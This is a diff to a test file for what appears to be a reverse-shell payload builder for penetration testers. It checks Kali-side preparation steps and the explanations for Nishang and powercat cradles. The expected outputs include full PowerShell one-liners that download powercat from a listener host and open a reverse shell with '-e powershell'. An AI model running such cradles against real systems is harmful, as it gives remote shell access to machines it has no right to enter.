@@ -139,6 +139,9 @@ describe("served cradles: the Kali-side prepare step", () => {
       expect(b.parts.some((p) => p.token.startsWith(t)), t).toBe(true);
     }
     expect(b.notes.join(" ")).not.toMatch(/Serve it first/);
+    const cp = b.parts.find((p) => p.token.startsWith("cp /usr/share/nishang"))!;
+    expect(cp.explain).toContain("From Kali's `nishang` package");
+    expect(cp.explain).toContain("dpkg -L nishang | grep Invoke-PowerShellTcp");
   });
 
   it("Nishang with LPORT 80: the web server moves to 8000 and the cradle says :8000", () => {
@@ -158,6 +161,7 @@ describe("served cradles: the Kali-side prepare step", () => {
     expect(b.prepare).toBe("cp /usr/share/windows-resources/powercat/powercat.ps1 .\npython3 -m http.server 80");
     expect(b.text).toBe("IEX(New-Object System.Net.WebClient).DownloadString('http://192.0.2.10/powercat.ps1');powercat -c 192.0.2.10 -p 443 -e powershell");
     expect(b.parts.some((p) => p.token.startsWith("cp /usr/share/windows-resources/powercat/powercat.ps1"))).toBe(true);
+    expect(b.parts.find((p) => p.token.startsWith("cp /usr/share/windows-resources/powercat"))!.explain).toContain("From Kali's `powercat` package");
     const on80 = buildPayload(def("powercat-cradle"), "powershell", { LHOST: "192.0.2.10", LPORT: "80" });
     expect(on80.prepare).toBe("cp /usr/share/windows-resources/powercat/powercat.ps1 .\npython3 -m http.server 8000");
     expect(on80.text).toBe("IEX(New-Object System.Net.WebClient).DownloadString('http://192.0.2.10:8000/powercat.ps1');powercat -c 192.0.2.10 -p 80 -e powershell");
